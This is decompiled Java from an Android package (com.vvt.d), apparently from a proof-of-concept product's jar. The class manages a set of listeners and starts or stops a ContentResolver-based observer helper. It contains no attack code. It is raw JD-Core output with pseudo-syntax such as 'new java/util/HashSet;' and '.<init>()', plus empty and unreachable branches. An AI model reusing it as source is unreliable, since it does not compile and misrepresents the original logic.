package com.vvt.d;

import android.content.ContentResolver;
import java.util.HashSet;
import java.util.Iterator;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private HashSet b;
  private c c;
  
  public a()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.b = localHashSet;
  }
  
  private void a()
  {
    Object localObject = this.b;
    Iterator localIterator = ((HashSet)localObject).iterator();
    for (;;)
    {
      boolean bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (b)localIterator.next();
      ((b)localObject).a();
    }
  }
  
  public void a(b paramb)
  {
    Object localObject = this.b;
    boolean bool = ((HashSet)localObject).remove(paramb);
    if (bool)
    {
      bool = a;
      if (bool) {}
      localObject = this.b;
      bool = ((HashSet)localObject).isEmpty();
      if (bool)
      {
        bool = a;
        if (bool) {}
        localObject = this.c;
        ((c)localObject).d();
        bool = a;
        if (!bool) {}
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (!bool) {}
    }
  }
  
  public void a(b paramb, ContentResolver paramContentResolver)
  {
    Object localObject = this.b;
    boolean bool = ((HashSet)localObject).add(paramb);
    if (bool)
    {
      bool = a;
      if (bool) {}
      localObject = this.c;
      if (localObject == null)
      {
        localObject = new com/vvt/d/c;
        ((c)localObject).<init>(this, paramContentResolver);
        this.c = ((c)localObject);
      }
      localObject = this.c;
      bool = ((c)localObject).e();
      if (!bool)
      {
        localObject = this.c;
        ((c)localObject).c();
        bool = a;
        if (!bool) {}
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (!bool) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/d/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */